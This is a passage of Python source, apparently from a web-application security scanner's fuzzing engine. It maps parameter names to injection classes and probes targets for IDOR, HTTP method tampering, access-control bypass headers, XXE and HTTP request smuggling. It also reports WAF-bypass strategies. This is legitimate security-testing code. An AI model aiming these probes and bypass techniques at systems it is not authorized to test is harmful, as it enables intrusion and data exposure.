    PARAM_NAME_RULES: list[tuple[re.Pattern, list[str]]] = PARAM_NAME_RULE_EXTENSIONS + [
        # email, mail → header injection, email injection payloads
        (re.compile(r"(?i)(?:^|_|-)(e?mail|email_addr|from|to|cc|bcc|reply.?to)(?:$|_|-)"),
         ["header_injection", "crlf_injection", "ssrf", "ssti"]),
        # redirect, next, url, return_to, checkout_url, rurl, target … (full OWASP list)
        # These are the highest-value parameters for open redirect + SSRF — test first.
        (re.compile(
            r"(?i)(?:^|_|-|%5[Bb])"
            r"(redirect|redirect_uri|redirect_url|redirect_to|redirecturl|"
            r"next|return|return_to|return_url|returnto|returnurl|"
            r"go|goto|dest|destination|forward|forward_url|"
            r"url|uri|link|href|"
            r"continue|checkout_url|cancel_url|success_url|failure_url|"
            r"target|to|redir|rurl|r|u|"
            r"ref|referrer|referer|"
            r"view|image_url|"
            r"callback|callbackurl|callback_url|"
            r"next_page|back|back_url|page|"
            r"site|host|domain)"
            r"(?:$|_|-|%5[Dd])"
        ),
         ["open_redirect", "ssrf", "xss_reflected"]),
        # template, tpl, view → SSTI (Jinja2, Freemarker, Pebble, Twig, Smarty)
        (re.compile(r"(?i)(?:^|_|-)(template|tpl|view|layout|theme|render|format)(?:$|_|-)"),
         ["ssti", "xss_reflected", "el_injection"]),
        # file, path, filename, include → path traversal, LFI, RFI
        (re.compile(r"(?i)(?:^|_|-)(file|path|filename|filepath|include|page|doc|document|dir|folder|src|source|load|read|import)(?:$|_|-)"),
         ["lfi", "rfi", "ssrf", "xss_reflected"]),
        # query, search, q, keyword → SQLi, NoSQLi, XSS
        (re.compile(r"(?i)(?:^|_|-)(query|search|q|keyword|term|filter|find|lookup|where|select|sort|order|group)(?:$|_|-)"),
         ["sqli_error", "sqli_bool_true", "sqli_blind_time", "nosql_injection",
          "xss_reflected", "xpath_injection", "ldap_injection"]),
        # cmd, exec, command, run → OS command injection
        (re.compile(r"(?i)(?:^|_|-)(cmd|exec|command|run|shell|process|system|ping|ip|host|hostname|domain)(?:$|_|-)"),
         ["cmdi", "ssrf", "ssti", "log4shell"]),
        # xml, svg, data → XXE, SSRF via XML
        (re.compile(r"(?i)(?:^|_|-)(xml|svg|data|soap|payload|body|content|input|raw)(?:$|_|-)"),
         ["xxe", "xml_injection", "ssrf", "xss_reflected", "deserialization"]),
        # callback, jsonp, cb → open redirect, JSONP injection
        (re.compile(r"(?i)(?:^|_|-)(callback|jsonp|cb|handler|hook|webhook|endpoint|api)(?:$|_|-)"),
         ["open_redirect", "xss_reflected", "ssrf", "header_injection"]),
        # Authorization, token, bearer, jwt → JWT algorithm confusion
        (re.compile(r"(?i)(?:^|_|-)(authorization|bearer|token|jwt|access.?token|auth.?token|id.?token)(?:$|_|-)"),
         ["jwt_confusion", "header_injection", "crlf_injection"]),
        # template, report, pdf, latex → LaTeX injection (PDF-gen endpoints)
        (re.compile(r"(?i)(?:^|_|-)(latex|pdf.?templ|templ.?pdf|report|invoice|receipt|document.?gen|render.?pdf|pdf.?render)(?:$|_|-)"),
         ["latex_injection", "ssti", "lfi"]),
        # style, css, theme, color, background → CSS injection
        (re.compile(r"(?i)(?:^|_|-)(style|css|theme|color|colour|background|skin|appearance|font)(?:$|_|-)"),
         ["css_injection", "xss_reflected"]),
        # class, classLoader, module → Spring4Shell DataBinder
        (re.compile(r"(?i)(?:^|_|-)(?:class|classLoader|class.?loader|modules?|data.?class|bean.?class)(?:$|_|-)"),
         ["spring4shell", "el_injection"]),
        # xsl, xslt, transform, stylesheet → XSLT injection
        (re.compile(r"(?i)(?:^|_|-)(xsl|xslt|transform|stylesheet|xsl.?file|xsl.?template)(?:$|_|-)"),
         ["xslt_injection", "xxe", "lfi"]),
    ]

    @staticmethod
    def name_based_vuln_types(param_name: str) -> list[str]:
        """
        Match parameter name against PARAM_NAME_RULES.
        Returns prioritized vuln types for the first matching rule, or empty list.
        """
        for pattern, vuln_types in Fuzzer.PARAM_NAME_RULES:
            if pattern.search(param_name):
                return list(vuln_types)
        return []

    def __init__(
        self,
        scope: ScopeManager,
        session: requests.Session,
        ev_store: EvidenceStore | None = None,
        timeout:       int = 10,
        time_threshold: float = 2.5,   # seconds delta for time-based detection
        max_surfaces:  int = 1000,
        rate_limit:    float = 0.05,   # min seconds between requests
        max_fuzz_time: int = 0,        # wall-clock cap in seconds; 0 = no limit
        max_per_type:  int = 8,        # max payloads per vuln_type per surface; 0 = unlimited
        on_finding: Callable | None = None,
        stop_event: threading.Event | None = None,
        oast: "OASTServer | None" = None,
        tech_fingerprint: dict | None = None,
        llm_provider: "Any | None" = None,
        scan_id: str = "",
        transform_mode: "Any | None" = None,
        safety_policy: str = "standard",
        allow_dangerous_endpoints: bool = False,
    ):
        self.scope          = scope
        self.session        = session
        self.ev_store       = ev_store or _global_store
        self.scan_id        = scan_id
        self.timeout        = timeout
        self._proof_validator = ProofValidator(self.session, self.timeout) if _HAS_PROOF else None
        self.time_threshold = time_threshold
        self.max_surfaces   = max_surfaces
        self.rate_limit     = rate_limit
        self.max_fuzz_time  = max_fuzz_time
        self.max_per_type   = max_per_type   # 0 = unlimited
        self._payload_safety = PayloadSafetyFilter(safety_policy)
        self.allow_dangerous_endpoints = allow_dangerous_endpoints
        self.on_finding     = on_finding
        self.stop_event     = stop_event or threading.Event()
        self.results:       list[FuzzResult] = []
        self._lock          = threading.Lock()
        self.oast           = oast
        self._oast_tokens:  dict[str, dict] = {}  # token/payload_id → {vuln_type, surface, severity}
        # CollaboratorClient wraps the OASTServer with typed per-payload tracking
        self._collaborator = None
        if oast is not None:
            try:
                from .oast import CollaboratorClient as _CC
                self._collaborator = _CC(oast)
            except Exception:
                pass
        self.tech_fingerprint = tech_fingerprint or {}
        self.llm_provider   = llm_provider
        # HTTP transform mode for WAF bypass encoding
        try:
            from .http_transform import HttpTransformation as _HT
            self.transform_mode = transform_mode if isinstance(transform_mode, _HT) else _HT.NONE
        except Exception:
            self.transform_mode = None
        self._deep_scan_params: set[tuple[str, str]] = set()
        self._waf_detected = False
        self._successful_mutations: list[int] = []   # strategy indices that bypassed WAF
        self._identified_waf: str | None = None       # detected WAF product name
        self._waf_stats: dict = {
            "total_blocked": 0,
            "total_bypassed": 0,
            "strategy_success": {},   # strategy_name → count
            "strategy_fail": {},      # strategy_name → count
        }
        self._sqli_candidates: list[str] = []

    def _is_payload_safe(self, payload) -> bool:
        """Return True when a payload can be sent under the active safety policy."""
        if payload is None:
            return True
        if isinstance(payload, bytes):
            text = payload.decode("utf-8", errors="ignore")
        else:
            text = str(payload)
        if not text:
            return True
        return self._payload_safety.is_safe(text)

    @property
    def sqli_candidates(self) -> list[str]:
        with self._lock:
            return list(self._sqli_candidates)

    def fuzz_all(self, surfaces: list, on_payload_sent=None) -> list[FuzzResult]:
        """
        Fuzz all input surfaces. Returns list of confirmed findings.
        Runs in parallel threads up to 5 concurrent.
        After in-band fuzzing, polls OAST for out-of-band callbacks.
        Hard wall-clock cap: self.max_fuzz_time seconds (default 1800).
        on_payload_sent: optional callable(count) called after each payload send.
        """
        from concurrent.futures import ThreadPoolExecutor, as_completed

        self._fuzz_deadline = (time.time() + self.max_fuzz_time) if self.max_fuzz_time > 0 else float('inf')
        self._payloads_sent_count = 0
        self._on_payload_sent = on_payload_sent
        log.info("FUZZ START surfaces=%d max_surfaces=%d max_time=%ds",
                 len(surfaces), self.max_surfaces, self.max_fuzz_time or 0)

        def _over() -> bool:
            return self.stop_event.is_set() or time.time() > self._fuzz_deadline

        try:
            from .ranking import rank_surfaces as _rank_surfaces
            surfaces = _rank_surfaces(surfaces)
        except Exception:
            pass
        limited = surfaces[:self.max_surfaces]
        self._surfaces_total = len(limited)
        self._surfaces_done  = 0
        with ThreadPoolExecutor(max_workers=5) as pool:
            futures = {pool.submit(self._fuzz_surface, s): s for s in limited}
            for fut in as_completed(futures):
                if _over():
                    pool.shutdown(wait=False, cancel_futures=True)
                    break
                try:
                    fut.result()
                except Exception as _fe:
                    log.error("Surface fuzz error: %s", _fe, exc_info=True)
                self._surfaces_done += 1
                cb = getattr(self, '_on_payload_sent', None)
                if cb:
                    try: cb(self._payloads_sent_count)
                    except Exception: pass

        # ── HTTP Request Smuggling — per-URL, not per-param ─────────────
        if not _over():
            smuggling_urls = list({s.url for s in limited})[:10]  # max 10 URLs
            for url in smuggling_urls:
                if _over():
                    break
                self._fuzz_http_smuggling(url)

        # ── CSRF bypass testing — per-form, not per-param ─────────────────
        if not _over():
            self._fuzz_csrf(limited)

        # ── HTTP verb tampering — per-URL, test method bypass ──────────────
        if not _over():
            self._fuzz_verb_tamper(limited)

        # ── Host header injection — per-URL, test cache/reset poisoning ────
        if not _over():
            self._fuzz_host_header(limited)

        # ── File upload bypass testing — multipart/file-param surfaces ────
        if not _over():
            self._fuzz_upload_surfaces(limited)

        # ── Collect OAST out-of-band findings ────────────────────────────
        if self.oast and self._oast_tokens:
            self._collect_oast_findings()

        return self.results

    # Bool-blind threshold is now computed dynamically per surface (3σ statistical).

    def get_waf_report(self) -> dict:
        """Return structured WAF evasion intelligence report."""
        if not self._waf_detected:
            return {"waf_detected": False}

        total = self._waf_stats["total_blocked"] + self._waf_stats["total_bypassed"]
        bypass_rate = (self._waf_stats["total_bypassed"] / total * 100) if total > 0 else 0

        # Rank strategies by success count
        top_strategies = sorted(
            self._waf_stats["strategy_success"].items(),
            key=lambda x: x[1], reverse=True
        )

        return {
            "waf_detected": True,
            "waf_product": self._identified_waf or "Unknown WAF",
            "total_requests_blocked": self._waf_stats["total_blocked"],
            "total_bypasses": self._waf_stats["total_bypassed"],
            "bypass_rate_pct": round(bypass_rate, 1),
            "top_strategies": [{"strategy": s, "successes": c} for s, c in top_strategies[:5]],
            "successful_strategy_indices": self._successful_mutations[:5],
            "recommendations": self._waf_recommendations(),
        }

    def _waf_recommendations(self) -> list[str]:
        """Generate WAF-specific remediation and testing recommendations."""
        recs = []
        waf = self._identified_waf
        if waf == "Cloudflare":
            recs.append("Cloudflare detected — test with Unicode/fullwidth character bypasses")
            recs.append("Check if Cloudflare is in 'I\'m Under Attack' mode vs standard")
        elif waf == "ModSecurity":
            recs.append("ModSecurity CRS detected — test paranoia level (PL1-PL4)")
            recs.append("Comment injection (SEL/**/ECT) often bypasses PL1-PL2")
        elif waf == "AWS WAF":
            recs.append("AWS WAF detected — test with double/triple URL encoding")
            recs.append("Check for custom vs managed rule groups")
        elif waf:
            recs.append(f"{waf} detected — review vendor-specific bypass documentation")

        if self._waf_stats["total_bypassed"] > 0:
            recs.append(f"WAF bypassed {self._waf_stats['total_bypassed']} times — WAF rules may need tuning")
        else:
            recs.append("No bypasses achieved — WAF appears well-configured for tested payloads")

        return recs

    def _fuzz_surface(self, surface):
        if (
            not self.allow_dangerous_endpoints
            and is_dangerous_endpoint(surface.method, surface.url, surface.param)
        ):
            log.info(
                "Skipping active fuzzing for sensitive endpoint: %s %s [%s]",
                surface.method,
                surface.url,
                surface.param,
            )
            return

        location_types = self.PARAM_TYPE_MAP.get(surface.param_type, ["sqli_error", "xss_reflected"])

        # ── Context-aware: prioritize payloads by parameter name semantics ──
        name_types = self.name_based_vuln_types(surface.param)
        if name_types:
            # Name-matched types first, then remaining location-based (deduplicated)
            seen = set(name_types)
            vuln_types = name_types + [vt for vt in location_types if vt not in seen]
        else:
            vuln_types = location_types

        # ── Technology-specific: add framework payloads if fingerprint detected ──
        if self.tech_fingerprint:
            frameworks = self.tech_fingerprint.get("framework", [])
            for fw in frameworks:
                fw_payloads = FRAMEWORK_PAYLOADS.get(fw, [])
                for payload_str, vtype, desc in fw_payloads:
                    if self.stop_event.is_set():
                        return
                    time.sleep(self.rate_limit)
                    self._send_payload(surface, vtype, payload_str, None)

        _dl = getattr(self, '_fuzz_deadline', float('inf'))
        for vuln_type in vuln_types:
            if self.stop_event.is_set() or time.time() > _dl:
                return

            # ── IDOR — ID enumeration + method tampering + ACL bypass ──
            if vuln_type == "idor":
                self._fuzz_idor(surface)
                continue

            # ── XXE — raw XML body injection, needs dedicated method ──
            if vuln_type == "xxe":
                if surface.method in ("POST", "PUT", "PATCH"):
                    self._fuzz_xxe(surface)
                continue

            # ── Stored XSS — inject canary, re-fetch to verify persistence ──
            if vuln_type == "xss_stored":
                self._fuzz_stored_xss(surface)
                continue

            # ── Boolean-based blind SQLi — paired differential analysis ──
            if vuln_type == "sqli_bool_true":
                self._fuzz_boolean_blind(surface)
                continue

            # Skip sqli_bool_false — handled inside _fuzz_boolean_blind
            if vuln_type == "sqli_bool_false":
                continue

            payloads = PAYLOADS.get(vuln_type, [])
            if not payloads:
                continue

            # For time-based, need baseline first
            baseline_time = None
            if vuln_type == "sqli_blind_time":
                baseline_time = self._baseline(surface)

            _per_type_cap = len(payloads) if (surface.url, surface.param) in self._deep_scan_params else (self.max_per_type or len(payloads))
            max_payloads = _per_type_cap
            for payload in payloads[:max_payloads]:   # capped by max_per_type profile setting (0 = unlimited)
                if self.stop_event.is_set() or time.time() > _dl:
                    return
                time.sleep(self.rate_limit)
                self._send_payload(surface, vuln_type, payload, baseline_time)
                # ── Contextual encoding: if param value is encoded server-side,
                #    send payload pre-encoded in the same encoding ──────────────
                _orig_val = surface.original_value or ''
                # Detect Base64-encoded original value
                if (len(_orig_val) >= 8
                        and re.match(r'^[A-Za-z0-9+/]{8,}={0,2}$', _orig_val)
                        and len(_orig_val) % 4 == 0):
                    try:
                        base64.b64decode(_orig_val)
                        _ctx_payload = base64.b64encode(payload.encode()).decode()
                        if _ctx_payload != payload:
                            self._send_payload(surface, vuln_type, _ctx_payload, baseline_time)
                    except Exception:
                        pass
                # Detect URL-encoded original value
                elif '%' in _orig_val and re.search(r'%[0-9A-Fa-f]{2}', _orig_val):
                    _ctx_payload = _url_quote(payload, safe='')
                    if _ctx_payload != payload:
                        self._send_payload(surface, vuln_type, _ctx_payload, baseline_time)

        # ── Serialized insertion points — fuzz inside encoded wrappers ─────
        self._fuzz_serialized_insertions(surface)

        # ── LLM-adaptive payload generation with response feedback ────────
        self._fuzz_with_llm(surface)

        # ── OAST out-of-band payloads for blind vulnerabilities ──────────
        if self.oast and self.oast.started:
            self._inject_oast_payloads(surface)

    def _fuzz_boolean_blind(self, surface):
        """
        Boolean-based blind SQLi: send paired true/false payloads and compare
        responses using ResponseVariationAnalyzer (structural: length, status,
        timing, headers, content-type) + ResponseKeywordsAnalyzer (keyword
        differential).

        Threshold = max(3σ, 5% of mean, 20B) — eliminates false positives from
        variable-content pages (random tokens, timestamps, ad banners).
        """
        from .passive import ResponseVariationAnalyzer, ResponseKeywordsAnalyzer

        true_payloads  = PAYLOADS.get("sqli_bool_true", [])
        false_payloads = PAYLOADS.get("sqli_bool_false", [])
        if not true_payloads or not false_payloads:
            return

        import datetime as _dt

        def _elapsed_ms(resp) -> float:
            """Safely extract elapsed time in ms from a requests.Response."""
            _e = getattr(resp, "elapsed", None)
            if isinstance(_e, _dt.timedelta):
                return _e.total_seconds() * 1000
            return 0.0

        var_analyzer = ResponseVariationAnalyzer(timing_threshold_ms=3000.0)
        kw_analyzer  = ResponseKeywordsAnalyzer()

        # ── Collect 5 baseline responses ──────────────────────────────────────
        for _ in range(5):
            if self.stop_event.is_set():
                return
            r = self._send_and_capture(surface, "BASELINE_VALUE")
            if r is not None:
                var_analyzer.add_baseline(r, elapsed_ms=_elapsed_ms(r))
            time.sleep(self.rate_limit)

        if var_analyzer.baseline_count() < 3:
            return  # not enough baselines for meaningful statistics

        for tp, fp in zip(true_payloads[:6], false_payloads[:6]):
            if self.stop_event.is_set():
                return
            time.sleep(self.rate_limit)

            true_resp = self._send_and_capture(surface, tp)
            if true_resp is None:
                continue
            time.sleep(self.rate_limit)

            false_resp = self._send_and_capture(surface, fp)
            if false_resp is None:
                continue

            true_elapsed_ms = _elapsed_ms(true_resp)

            # ── Structural comparison via ResponseVariationAnalyzer ───────────
            variation = var_analyzer.compare(
                true_resp, elapsed_ms=true_elapsed_ms, injected_input=tp
            )

            # ── Keyword differential via ResponseKeywordsAnalyzer ─────────────
            kw_matches = kw_analyzer.analyze_pair(
                true_resp.text, false_resp.text, tp, fp
            )

            true_len  = len(true_resp.text)
            false_len = len(false_resp.text)
            length_delta = abs(true_len - false_len) / max(true_len, false_len, 1)
            if var_analyzer.baseline_count() >= 3:
                _b_lens  = [b["body_len"] for b in var_analyzer._baselines]
                _mean    = sum(_b_lens) / len(_b_lens)
                _sigma   = (sum((l - _mean) ** 2 for l in _b_lens) / len(_b_lens)) ** 0.5
                _thresh  = max(3 * _sigma, _mean * 0.05, 20)
                delta_triggered = abs(true_len - false_len) > _thresh
            else:
                delta_triggered = length_delta >= 0.30

            if variation.has_significant_variation or kw_matches or delta_triggered:
                evidence_parts = []
                if variation.has_significant_variation:
                    evidence_parts.append(variation.summary())
                if kw_matches:
                    kw_desc = "; ".join(
                        f"{m.category}:{m.keyword}" for m in kw_matches[:3]
                    )
                    evidence_parts.append(f"keywords=[{kw_desc}]")
                if delta_triggered:
                    evidence_parts.append(f"length-delta={length_delta:.0%}")

                finding_text = (
                    f"Boolean-based blind SQLi — "
                    + " | ".join(evidence_parts)
                    + f" [{surface.param}: true={tp[:40]}, false={fp[:40]}]"
                )
                url = self._build_url(surface, tp)

                proof_label, proof_data = None, None
                if self._proof_validator:
                    try:
                        proof_label, proof_data = self._proof_validator.validate(
                            "sqli_bool_true", surface, url, tp, true_resp)
                    except Exception:
                        pass
                if proof_label:
                    finding_text = f"{proof_label} [{surface.url} | param={surface.param}]"

                headers = self._build_headers(surface, tp)
                body    = self._build_body(surface, tp)
                eid     = self._store_evidence(surface, "sqli_bool_true", tp, url,
                                               headers, body or "", true_resp, 0.0)
                self._record_finding(surface, "sqli_bool_true", tp, finding_text,
                                     "high", url, dict(true_resp.headers),
                                     str(headers), true_resp.text,
                                     0.0, true_resp.status_code, eid,
                                     proof=proof_label, proof_data=proof_data)
                with self._lock:
                    self._sqli_candidates.append(url)
                return  # one boolean blind finding per surface is enough

    # ── Stored XSS canary patterns for verifying unescaped persistence ────
    _STORED_XSS_CONFIRM_PATTERNS = [
        re.compile(r"<script[^>]*>alert\(['\"]?{CANARY}['\"]?\)</script>", re.I),
        re.compile(r"onerror\s*=\s*alert\(['\"]?{CANARY}['\"]?\)", re.I),
        re.compile(r"onload\s*=\s*alert\(['\"]?{CANARY}['\"]?\)", re.I),
        re.compile(r"ontoggle\s*=\s*alert\(['\"]?{CANARY}['\"]?\)", re.I),
        re.compile(r"onfocus\s*=\s*alert\(['\"]?{CANARY}['\"]?\)", re.I),
        re.compile(r"javascript:\s*alert\(['\"]?{CANARY}['\"]?\)", re.I),
        re.compile(r"<iframe[^>]*srcdoc\s*=", re.I),
        re.compile(r"onmouseover\s*=\s*alert\(['\"]?{CANARY}['\"]?\)", re.I),
    ]

    # Param names that suggest object/resource IDs (IDOR candidates)
    _IDOR_PARAM_PATTERNS = re.compile(
        r"(?i)(^id$|_id$|Id$|^uid$|^pid$|^fid$|^nid$|"
        r"user.?id|account.?id|order.?id|item.?id|product.?id|"
        r"customer.?id|invoice.?id|doc.?id|file.?id|record.?id|"
        r"profile.?id|session.?id|project.?id|ticket.?id|"
        r"^no$|^num$|^number$|^index$|^idx$|^key$|^ref$)"
    )

    def _fuzz_idor(self, surface):
        """
        IDOR / Broken Access Control testing:
        1) ID enumeration: swap ID-like params with adjacent/test values, compare responses
        2) HTTP method tampering: try PUT/DELETE/PATCH on discovered endpoints
        3) ACL bypass headers: X-Original-URL, X-Rewrite-URL path override
        """
        # ── 1) ID enumeration (only on ID-like params) ──────────────────
        if self._IDOR_PARAM_PATTERNS.search(surface.param):
            self._idor_enumerate(surface)

        # ── 2) HTTP method tampering (one attempt per surface) ──────────
        self._idor_method_tamper(surface)

        # ── 3) ACL bypass headers ───────────────────────────────────────
        self._idor_acl_bypass(surface)

    def _idor_enumerate(self, surface):
        """Try adjacent/test IDs on ID-like params, compare to baseline."""
        original = surface.original_value.strip()

        # Build test IDs
        test_ids = []
        if original.isdigit():
            orig_int = int(original)
            test_ids = [
                str(orig_int + 1),
                str(orig_int - 1) if orig_int > 0 else "0",
                "0",
                "1" if original != "1" else "2",
                "9999",
                str(orig_int + 100),
            ]
        else:
            # Non-numeric — use static fallbacks
            test_ids = ["1", "2", "0", "admin", "test",
                        "00000000-0000-0000-0000-000000000000"]

        # Get baseline response with original value
        baseline_resp = self._send_and_capture(surface, original)
        if not baseline_resp:
            return
        baseline_len = len(baseline_resp.text)
        baseline_status = baseline_resp.status_code

        # If baseline is already 401/403/404, skip — can't determine IDOR
        if baseline_status in (401, 403, 404):
            return

        for test_id in test_ids[:5]:  # cap at 5 attempts
            if self.stop_event.is_set():
                return
            time.sleep(self.rate_limit)

            resp = self._send_and_capture(surface, test_id)
            if not resp:
                continue

            # Flag conditions:
            # - Same status (200) but DIFFERENT content = enumerable resource
            # - 200 when we expected same content = data from different object
            if resp.status_code == 200 and baseline_status == 200:
                len_diff = abs(len(resp.text) - baseline_len)
                # Content must be meaningfully different (not just timestamps)
                if len_diff > 50 and len_diff / max(baseline_len, 1) > 0.1:
                    # Check for PII/sensitive data patterns in swapped response
                    resp_text = resp.text[:4000]
                    for pattern, desc in DETECTORS.get("idor", []):
                        if re.search(pattern, resp_text, re.I):
                            finding_text = (
                                f"{desc} [{surface.url} | {surface.param}="
                                f"{test_id} (original={original})]"
                            )
                            eid = self._store_evidence(
                                surface, "idor", test_id, surface.url,
                                {}, "", resp, 0,
                            )
                            self._record_finding(
                                surface, "idor", test_id, finding_text,
                                "high", surface.url, dict(resp.headers),
                                "", resp_text, 0, resp.status_code, eid,
                            )
                            return  # one finding per surface

    def _idor_method_tamper(self, surface):
        """Try unexpected HTTP methods to detect missing method-level access control."""
        # Only test on non-mutation surfaces (GET endpoints)
        if surface.method != "GET":
            return

        tamper_methods = ["PUT", "DELETE", "PATCH"]
        headers = {"User-Agent": "Mozilla/5.0 (compatible; DAST-Scanner/1.0)",
                    "Content-Type": "application/json"}

        for method in tamper_methods:
            if self.stop_event.is_set():
                return
            time.sleep(self.rate_limit)

            try:
                resp = self.session.request(
                    method, surface.url,
                    data='{"test": "idor"}',
                    headers=headers,
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=False,
                )
                # Flag if server accepts the method (not 405 Method Not Allowed,
                # not 501 Not Implemented, not 404, not 401/403)
                if resp.status_code not in (401, 403, 404, 405, 501):
                    finding_text = (
                        f"HTTP method tampering — {method} accepted on GET endpoint "
                        f"(status {resp.status_code}) [{surface.url}]"
                    )
                    eid = self._store_evidence(
                        surface, "method_tamper", method, surface.url,
                        headers, '{"test": "idor"}', resp, 0,
                    )
                    self._record_finding(
                        surface, "method_tamper", method, finding_text,
                        "medium", surface.url, dict(resp.headers),
                        str(headers), resp.text[:2000], 0,
                        resp.status_code, eid,
                    )
                    return  # one method finding per surface
            except Exception:
                continue

    def _idor_acl_bypass(self, surface):
        """Test path-override headers to bypass access control."""
        bypass_headers = [
            ("X-Original-URL", "/admin"),
            ("X-Rewrite-URL", "/admin"),
            ("X-Original-URL", "/api/admin"),
            ("X-Rewrite-URL", "/api/users"),
            ("X-Custom-IP-Authorization", "127.0.0.1"),
            ("X-Forwarded-For", "127.0.0.1"),
            ("X-Real-IP", "127.0.0.1"),
        ]

        # First get baseline (no bypass headers)
        try:
            baseline = self.session.get(
                surface.url, timeout=self.timeout,
                verify=False, allow_redirects=False,
            )
        except Exception:
            return

        for header_name, header_value in bypass_headers[:4]:  # cap at 4
            if self.stop_event.is_set():
                return
            time.sleep(self.rate_limit)

            try:
                headers = {
                    "User-Agent": "Mozilla/5.0 (compatible; DAST-Scanner/1.0)",
                    header_name: header_value,
                }
                resp = self.session.get(
                    surface.url, headers=headers,
                    timeout=self.timeout, verify=False,
                    allow_redirects=False,
                )
                # If baseline was 403/401 but bypass gets 200 = confirmed
                if baseline.status_code in (401, 403) and resp.status_code == 200:
                    finding_text = (
                        f"ACL bypass CONFIRMED — {header_name}: {header_value} "
                        f"changed {baseline.status_code} to 200 [{surface.url}]"
                    )
                    eid = self._store_evidence(
                        surface, "acl_bypass", f"{header_name}: {header_value}",
                        surface.url, headers, "", resp, 0,
                    )
                    self._record_finding(
                        surface, "acl_bypass",
                        f"{header_name}: {header_value}", finding_text,
                        "high", surface.url, dict(resp.headers),
                        str(headers), resp.text[:2000], 0,
                        resp.status_code, eid,
                    )
                    return

                # If response is drastically different (different content, bigger)
                if (resp.status_code == 200 and baseline.status_code == 200
                        and abs(len(resp.text) - len(baseline.text)) > 200):
                    # Check for admin/sensitive content patterns
                    for pattern, desc in DETECTORS.get("idor", []):
                        if re.search(pattern, resp.text[:4000], re.I):
                            finding_text = (
                                f"ACL bypass likely — {header_name}: {header_value} "
                                f"exposes different content [{surface.url}]"
                            )
                            eid = self._store_evidence(
                                surface, "acl_bypass",
                                f"{header_name}: {header_value}",
                                surface.url, headers, "", resp, 0,
                            )
                            self._record_finding(
                                surface, "acl_bypass",
                                f"{header_name}: {header_value}",
                                finding_text, "high", surface.url,
                                dict(resp.headers), str(headers),
                                resp.text[:2000], 0, resp.status_code, eid,
                            )
                            return
            except Exception:
                continue

    def _fuzz_xxe(self, surface):
        """
        Send XXE payloads as raw XML body to POST/PUT/PATCH endpoints.
        Tries both application/xml and text/xml Content-Types.
        Detects via response pattern matching.
        """
        payloads = PAYLOADS.get("xxe", [])
        if not payloads:
            return

        content_types = ["application/xml", "text/xml"]

        for payload in payloads[:12]:  # cap at 12 payloads per surface
            if self.stop_event.is_set():
                return
            time.sleep(self.rate_limit)

            for ct in content_types:
                if self.stop_event.is_set():
                    return
                try:
                    headers = {
                        "User-Agent": "Mozilla/5.0 (compatible; DAST-Scanner/1.0)",
                        "Content-Type": ct,
                    }
                    t0 = time.time()
                    resp = self.session.request(
                        surface.method,
                        surface.url,
                        data=payload.encode("utf-8", errors="replace"),
                        headers=headers,
                        timeout=self.timeout,
                        verify=False,
                        allow_redirects=False,
                    )
                    elapsed = (time.time() - t0) * 1000

                    resp_text = ""
                    try:
                        resp_text = resp.text
                    except Exception:
                        pass

                    # Pattern-based detection
                    for pattern, desc in DETECTORS.get("xxe", []):
                        if re.search(pattern, resp_text, re.I | re.S):
                            finding_text = (
                                f"{desc} [{surface.url} | Content-Type={ct} "
                                f"| payload={payload[:80]}]"
                            )
                            eid = self._store_evidence(
                                surface, "xxe", payload, surface.url,
                                headers, payload, resp, elapsed,
                            )
                            self._record_finding(
                                surface, "xxe", payload, finding_text,
                                self.SEV_MAP.get("xxe", "critical"),
                                surface.url, dict(resp.headers),
                                str(headers), resp_text, elapsed,
                                resp.status_code, eid,
                            )
                            return  # found XXE — stop this surface

                except requests.exceptions.Timeout:
                    continue
                except Exception:
                    continue

    # ── HTTP Request Smuggling ─────────────────────────────────────────────

    def _fuzz_http_smuggling(self, url: str):
        """
        HTTP Request Smuggling detection — sends CL.TE, TE.CL, TE.TE, CL.CL
        probes using both requests library (for simple probes) and raw sockets
        (for probes requiring duplicate/malformed headers).

        Detection methods:
        1. Status code anomaly (400, 500, 501, 505 on desync-inducing payloads)
        2. Timing differential (timeout on one variant but not another)
        3. Response body error patterns matching DETECTORS["http_smuggling"]
        4. Connection reset / unexpected close

        All probes are safe detection-only — no actual request poisoning.
        """
        import socket
        import ssl

        parsed = urlparse(url)
        host = parsed.hostname or ""
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        use_ssl = parsed.scheme == "https"
        path = parsed.path or "/"

        probes = PAYLOADS.get("http_smuggling", [])
        detectors = [(re.compile(pat, re.I), desc)
                     for pat, desc in DETECTORS.get("http_smuggling", [])]

        # Track which URLs already flagged to avoid dupes per technique
        seen_techniques: set[str] = set()

        for probe in probes:
            if self.stop_event.is_set():
                return

            name      = probe["name"]
            technique = probe["technique"]
            headers   = probe["headers"]
            body      = probe["body"]

            # Skip duplicate technique findings for same URL
            if technique in seen_techniques:
                continue

            try:
                finding = self._smuggling_raw_probe(
                    host, port, use_ssl, path, headers, body,
                    name, technique, url, detectors,
                )
                if finding:
                    self.results.append(finding)
                    seen_techniques.add(technique)
            except Exception:
                continue

            if self.rate_limit:
                time.sleep(self.rate_limit)

    def _smuggling_raw_probe(
        self, host: str, port: int, use_ssl: bool, path: str,
        headers: dict, body: str, name: str, technique: str,
        url: str, detectors: list,
    ) -> "FuzzResult | None":
        """Send a single smuggling probe via raw socket.

        Raw sockets are necessary because:
        - requests library deduplicates/normalizes Content-Length headers
        - requests library normalizes Transfer-Encoding values
        - We need to send duplicate headers (e.g., two Content-Length values)
        - We need to send malformed Transfer-Encoding (tabs, spaces, null bytes)
        """
        import socket
        import ssl

        # Build raw HTTP request
        request_lines = [f"POST {path} HTTP/1.1"]
        request_lines.append(f"Host: {host}")
        request_lines.append("Content-Type: application/x-www-form-urlencoded")
        request_lines.append("User-Agent: Mozilla/5.0 (DAST-Smuggling/2.0)")
        request_lines.append("Connection: keep-alive")

        # Add probe headers (may include duplicates with different casing)
        for hdr_name, hdr_val in headers.items():
            request_lines.append(f"{hdr_name}: {hdr_val}")

        raw_request = "\r\n".join(request_lines) + "\r\n\r\n" + body

        # Send via raw socket
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)

            if use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)

            sock.connect((host, port))
            sock.sendall(raw_request.encode("utf-8", errors="replace"))

            # Read response
            t0 = time.time()
            response_data = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response_data += chunk
                    # Don't read forever — 16KB is plenty for detection
                    if len(response_data) > 16384:
                        break
